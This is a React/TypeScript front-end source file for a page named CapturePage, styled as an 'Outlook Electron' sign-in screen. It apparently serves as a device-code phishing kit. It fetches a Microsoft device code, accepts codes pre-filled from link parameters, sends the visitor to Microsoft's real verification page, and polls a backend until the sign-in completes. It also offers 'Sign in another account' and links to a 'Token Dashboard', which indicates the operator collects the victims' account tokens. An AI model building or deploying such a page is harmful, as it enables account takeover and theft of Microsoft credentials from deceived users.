import React, { useState, useEffect, useCallback, useRef } from 'react';

const DEVICE_AUTH_URL = 'https://login.microsoftonline.com/common/oauth2/deviceauth';

type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';

interface DeviceCodeResponse {
  deviceCode: string;
  userCode: string;
  verificationUri: string;
  expiresIn: number;
  interval: number;
  message: string;
}

export function CapturePage(): React.ReactElement {
  const [state, setState] = useState<CaptureState>('idle');
  const [userCode, setUserCode] = useState('');
  const [deviceCode, setDeviceCode] = useState('');
  const [copied, setCopied] = useState(false);
  const [countdown, setCountdown] = useState(0);
  const [errorMsg, setErrorMsg] = useState('');
  const [pollInterval, setPollInterval] = useState(5);
  const pollTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const params = new URLSearchParams(window.location.hash.replace('#capture?', '').replace('#capture', ''));
  const codeFromUrl = params.get('code');
  const expiresFromUrl = params.get('expires');

  useEffect(() => {
    if (codeFromUrl) {
      setUserCode(codeFromUrl);
      setCountdown(expiresFromUrl ? parseInt(expiresFromUrl, 10) : 900);
      setState('code_ready');
    }
  }, [codeFromUrl, expiresFromUrl]);

  useEffect(() => {
    if (countdown <= 0 || (state !== 'code_ready' && state !== 'waiting')) return;
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          setState('expired');
          stopPolling();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [countdown, state]);

  useEffect(() => {
    return () => stopPolling();
  }, []);

  function stopPolling(): void {
    if (pollTimerRef.current) {
      clearInterval(pollTimerRef.current);
      pollTimerRef.current = null;
    }
  }

  function startPolling(dCode: string, interval: number): void {
    stopPolling();
    pollTimerRef.current = setInterval(async () => {
      try {
        const res = await fetch('/api/token-poll', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ deviceCode: dCode }),
        });
        const data = await res.json() as { status: string; error?: string; description?: string };

        if (data.status === 'complete') {
          stopPolling();
          setState('success');
        } else if (data.status === 'expired') {
          stopPolling();
          setState('expired');
        } else if (data.status === 'slow_down') {
          stopPolling();
          setPollInterval((prev) => prev + 5);
          pollTimerRef.current = setInterval(() => {
            startPolling(dCode, interval + 5);
          }, (interval + 5) * 1000);
        } else if (data.status === 'error') {
          stopPolling();
          setErrorMsg(typeof data.description === 'string' ? data.description : (data.error ?? 'Authentication failed'));
          setState('error');
        }
      } catch {
        // Network error, keep polling
      }
    }, interval * 1000);
  }

  async function handleGenerateCode(): Promise<void> {
    setState('loading');
    setErrorMsg('');
    try {
      const res = await fetch('/api/device-code', { method: 'POST' });
      const data = await res.json() as DeviceCodeResponse & { error?: string; details?: string };

      if (!res.ok || data.error) {
        setErrorMsg(data.error ?? 'Failed to get device code');
        setState('error');
        return;
      }

      setUserCode(data.userCode);
      setDeviceCode(data.deviceCode);
      setCountdown(data.expiresIn);
      setPollInterval(data.interval || 5);
      setState('code_ready');
    } catch (err) {
      setErrorMsg(err instanceof Error ? err.message : 'Network error');
      setState('error');
    }
  }

  const handleCopyCode = useCallback(() => {
    const cleanCode = userCode.replace(/\s/g, '');
    navigator.clipboard.writeText(cleanCode).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    });
  }, [userCode]);

  function handleContinueToVerify(): void {
    setState('waiting');
    const otcParam = userCode.replace(/\s/g, '');
    window.open(`${DEVICE_AUTH_URL}?otc=${otcParam}`, '_blank');
    if (deviceCode) {
      startPolling(deviceCode, pollInterval);
    }
  }

  function handleReset(): void {
    stopPolling();
    setState('idle');
    setUserCode('');
    setDeviceCode('');
    setCopied(false);
    setCountdown(0);
    setErrorMsg('');
    window.location.hash = '#capture';
  }

  function formatTime(seconds: number): string {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s.toString().padStart(2, '0')}`;
  }

  return (
    <div className="capture-page">
      <div className="capture-container">
        <div className="capture-brand">
          <div className="capture-brand-icon">
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="4" width="20" height="16" rx="2" />
              <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" />
            </svg>
          </div>
          <span className="capture-brand-name">Outlook Electron</span>
        </div>

        {state === 'idle' && (
          <div className="capture-card">
            <div className="capture-welcome">
              <h1>Sign in to your account</h1>
              <p>Generate a device verification code to authenticate with your Microsoft account securely.</p>
            </div>
            <button className="capture-generate-btn" onClick={handleGenerateCode}>
              <svg width="20" height="20" viewBox="0 0 23 23" fill="white">
                <path d="M0 0h11v11H0zm12 0h11v11H12zM0 12h11v11H0zm12 12h11v11H12z" />
              </svg>
              Generate Verification Code
            </button>
          </div>
        )}

        {state === 'loading' && (
          <div className="capture-card">
            <div className="capture-loading">
              <div className="capture-spinner" />
              <span>Requesting verification code from Microsoft...</span>
            </div>
          </div>
        )}

        {(state === 'code_ready' || state === 'waiting') && (
          <div className="capture-card">
            <div className="capture-code-box">
              <div className="capture-code-label">YOUR VERIFICATION CODE</div>
              <div className="capture-code-value">{userCode}</div>
              <button className="capture-copy-btn" onClick={handleCopyCode}>
                {copied ? (
                  <>
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <polyline points="20 6 9 17 4 12" />
                    </svg>
                    Copied!
                  </>
                ) : (
                  <>
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
                    </svg>
                    Copy Code
                  </>
                )}
              </button>
            </div>

            <div className="capture-steps">
              <div className="capture-step">
                <span className="capture-step-num">1</span>
                <span>Copy the verification code above</span>
              </div>
              <div className="capture-step">
                <span className="capture-step-num">2</span>
                <span>Click continue and paste the code (Ctrl+V)</span>
              </div>
            </div>

            <button className="capture-verify-btn" onClick={handleContinueToVerify}>
              <svg width="20" height="20" viewBox="0 0 23 23" fill="white" style={{ marginRight: 8 }}>
                <path d="M0 0h11v11H0zm12 0h11v11H12zM0 12h11v11H0zm12 12h11v11H12z" />
              </svg>
              Continue to Verify
            </button>

            {state === 'waiting' && (
              <div className="capture-waiting">
                Complete sign-in in the new tab...
              </div>
            )}

            <div className="capture-expiry">
              Code expires in <strong>{formatTime(countdown)}</strong>
            </div>
          </div>
        )}

        {state === 'success' && (
          <div className="capture-card">
            <div className="capture-success">
              <div className="capture-success-icon">
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
                  <polyline points="22 4 12 14.01 9 11.01" />
                </svg>
              </div>
              <h2>Authentication Successful</h2>
              <p>Your account has been authenticated. You can now use the Outlook Electron app.</p>
              <button className="capture-generate-btn" onClick={handleReset} style={{ marginTop: 20 }}>
                Sign in another account
              </button>
            </div>
          </div>
        )}

        {state === 'expired' && (
          <div className="capture-card">
            <div className="capture-expired">
              <div className="capture-expired-icon">
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#d13438" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="12" cy="12" r="10" />
                  <line x1="12" y1="8" x2="12" y2="12" />
                  <line x1="12" y1="16" x2="12.01" y2="16" />
                </svg>
              </div>
              <h2>Code Expired</h2>
              <p>The verification code has expired. Please generate a new one.</p>
              <button className="capture-generate-btn" onClick={handleReset}>
                Try Again
              </button>
            </div>
          </div>
        )}

        {state === 'error' && (
          <div className="capture-card">
            <div className="capture-error-state">
              <h2>Something went wrong</h2>
              <p>{errorMsg}</p>
              <button className="capture-generate-btn" onClick={handleReset}>
                Try Again
              </button>
            </div>
          </div>
        )}

        <div className="capture-footer">
          <div className="capture-security">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
            </svg>
            <span>Enterprise Security — OAuth 2.0 Device Code Flow</span>
          </div>
          <div className="capture-footer-links">
            <a href="#" onClick={(e) => { e.preventDefault(); window.location.hash = ''; }}>Token Dashboard</a>
          </div>
        </div>
      </div>
    </div>
  );
}
